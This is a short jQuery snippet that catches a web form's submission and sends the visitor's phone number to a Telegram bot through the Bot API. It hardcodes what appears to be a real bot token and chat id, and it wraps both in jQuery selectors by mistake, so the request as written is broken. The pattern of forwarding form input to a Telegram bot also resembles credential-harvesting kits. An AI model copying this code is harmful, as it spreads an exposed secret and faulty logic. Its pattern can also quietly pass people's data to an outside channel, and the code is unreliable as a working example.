$('form').submit(function(e){
	e.preventDefault();
	$.ajax({
    url:'https://api.telegram.org/bot'+$('6107873512:AAFJUt5a3kW817zVolbRTyi62ocj7jyPrPo').val()+'/sendMessage',
    method:'POST',
    data:{chat_id:$('573853462').val(),text:$('#phone').val()},
        success:function(){
  	alert('your message has been sent!');
  }
  });
});